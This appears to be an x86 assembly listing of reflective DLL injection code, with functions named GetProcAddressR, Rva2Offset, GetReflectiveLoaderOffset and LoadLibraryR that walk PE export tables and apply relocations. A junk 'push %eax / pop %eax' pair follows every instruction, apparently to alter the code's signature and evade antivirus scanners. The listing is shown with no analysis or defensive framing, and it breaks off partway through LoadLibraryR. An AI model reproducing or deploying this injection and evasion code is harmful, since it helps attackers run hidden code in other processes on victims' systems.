	cmpb	$-96, %al
push %eax
pop %eax
	jne	L58
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, (%ecx)
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L58:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzbl	1(%eax), %eax
push %eax
pop %eax
	andl	$-16, %eax
push %eax
pop %eax
	cmpb	$48, %al
push %eax
pop %eax
	jne	L60
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, (%ecx)
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L60:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzbl	1(%eax), %eax
push %eax
pop %eax
	andl	$-16, %eax
push %eax
pop %eax
	cmpb	$16, %al
push %eax
pop %eax
	jne	L61
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movzwl	(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	shrl	$16, %eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	leal	(%edx,%ebx), %eax
push %eax
pop %eax
	movw	%ax, (%ecx)
push %eax
pop %eax
	jmp	L59
push %eax
pop %eax
L61:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzbl	1(%eax), %eax
push %eax
pop %eax
	andl	$-16, %eax
push %eax
pop %eax
	cmpb	$32, %al
push %eax
pop %eax
	jne	L59
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movzwl	(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %ebx
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	andw	$4095, %ax
push %eax
pop %eax
	movzwl	%ax, %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	movl	%eax, %ecx
push %eax
pop %eax
	leal	(%edx,%ebx), %eax
push %eax
pop %eax
	movw	%ax, (%ecx)
push %eax
pop %eax
L59:
	addl	$2, -64(%ebp)
push %eax
pop %eax
L57:
	movl	-56(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -56(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L62
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	subl	%eax, -68(%ebp)
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	addl	%eax, -60(%ebp)
push %eax
pop %eax
L56:
	cmpl	$0, -68(%ebp)
push %eax
pop %eax
	je	L55
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	4(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L63
push %eax
pop %eax
L55:
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	40(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$-1, (%esp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	-84(%ebp), %edx
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$12, %esp
push %eax
pop %eax
	movl	$0, -156(%ebp)
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %edx
push %eax
pop %eax
	movl	-84(%ebp), %eax
push %eax
pop %eax
	leal	-156(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	$32, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	%eax, -100(%ebp)
push %eax
pop %eax
	cmpl	$0, -100(%ebp)
push %eax
pop %eax
	je	L64
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	jmp	L66
push %eax
pop %eax
L64:
	movl	$0, %eax
push %eax
pop %eax
L66:
	movl	-4(%ebp), %ebx
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_GetProcAddressR@8
	.def	_GetProcAddressR@8;	.scl	2;	.type	32;	.endef
_GetProcAddressR@8:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$72, %esp
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	jne	L71
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	jmp	L72
push %eax
pop %eax
L71:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	movl	$0, -40(%ebp)
push %eax
pop %eax
	movl	$0, -44(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$120, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	shrl	$16, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L73
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L78
push %eax
pop %eax
L73:
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	jmp	L75
push %eax
pop %eax
L77:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strcmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L76
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L78
push %eax
pop %eax
L76:
	addl	$4, -16(%ebp)
push %eax
pop %eax
	addl	$2, -20(%ebp)
push %eax
pop %eax
L75:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -24(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L77
push %eax
pop %eax
L78:
	movl	-12(%ebp), %eax
push %eax
pop %eax
L72:
	leave
push %eax
pop %eax
	ret	$8
push %eax
pop %eax
	.globl	_Rva2Offset
	.def	_Rva2Offset;	.scl	2;	.type	32;	.endef
_Rva2Offset:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movw	$0, -2(%ebp)
push %eax
pop %eax
	movl	$0, -8(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, 16(%ebp)
push %eax
pop %eax
	je	L80
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movzwl	20(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -8(%ebp)
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jnb	L81
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	jmp	L82
push %eax
pop %eax
L81:
	movw	$0, -2(%ebp)
push %eax
pop %eax
	jmp	L83
push %eax
pop %eax
L85:
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jb	L84
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %ecx
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jnb	L84
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %ecx
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	jmp	L82
push %eax
pop %eax
L84:
	movzwl	-2(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movw	%ax, -2(%ebp)
push %eax
pop %eax
L83:
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movzwl	6(%eax), %eax
push %eax
pop %eax
	cmpw	%ax, -2(%ebp)
push %eax
pop %eax
	jb	L85
push %eax
pop %eax
	jmp	L86
push %eax
pop %eax
L80:
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movzwl	20(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -8(%ebp)
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jnb	L87
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	jmp	L82
push %eax
pop %eax
L87:
	movw	$0, -2(%ebp)
push %eax
pop %eax
	jmp	L88
push %eax
pop %eax
L90:
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jb	L89
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %ecx
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	cmpl	%eax, 8(%ebp)
push %eax
pop %eax
	jnb	L89
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	12(%eax), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %ecx
push %eax
pop %eax
	subl	%eax, %ecx
push %eax
pop %eax
	movzwl	-2(%ebp), %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	sall	$3, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-8(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	jmp	L82
push %eax
pop %eax
L89:
	movzwl	-2(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movw	%ax, -2(%ebp)
push %eax
pop %eax
L88:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movzwl	6(%eax), %eax
push %eax
pop %eax
	cmpw	%ax, -2(%ebp)
push %eax
pop %eax
	jb	L90
push %eax
pop %eax
L86:
	movl	$0, %eax
push %eax
pop %eax
L82:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_GetReflectiveLoaderOffset
	.def	_GetReflectiveLoaderOffset;	.scl	2;	.type	32;	.endef
_GetReflectiveLoaderOffset:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	$0, -28(%ebp)
push %eax
pop %eax
	movl	$0, -32(%ebp)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -36(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	60(%eax), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movzwl	24(%eax), %eax
push %eax
pop %eax
	cmpw	$267, %ax
push %eax
pop %eax
	jne	L92
push %eax
pop %eax
	movl	$0, -24(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	addl	$120, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L93
push %eax
pop %eax
L92:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movzwl	24(%eax), %eax
push %eax
pop %eax
	cmpw	$523, %ax
push %eax
pop %eax
	jne	L94
push %eax
pop %eax
	movl	$1, -24(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	addl	$136, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	jmp	L93
push %eax
pop %eax
L94:
	movl	$0, %eax
push %eax
pop %eax
	jmp	L95
push %eax
pop %eax
L93:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	shrl	$16, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L96
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movzwl	%ax, %edx
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	subl	%eax, %edx
push %eax
pop %eax
	movl	%edx, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	jmp	L95
push %eax
pop %eax
L96:
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, -20(%ebp)
push %eax
pop %eax
	jmp	L97
push %eax
pop %eax
L99:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strstr
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L98
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	addl	%edx, %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %eax
push %eax
pop %eax
	movzwl	(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	sall	$2, %eax
push %eax
pop %eax
	addl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	(%eax), %eax
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_Rva2Offset
push %eax
pop %eax
	jmp	L95
push %eax
pop %eax
L98:
	addl	$4, -12(%ebp)
push %eax
pop %eax
	addl	$2, -16(%ebp)
push %eax
pop %eax
L97:
	movl	-20(%ebp), %eax
push %eax
pop %eax
	leal	-1(%eax), %edx
push %eax
pop %eax
	movl	%edx, -20(%ebp)
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L99
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
L95:
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.globl	_LoadLibraryR@12
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
_LoadLibraryR@12:
	pushl	%ebp
push %eax
pop %eax
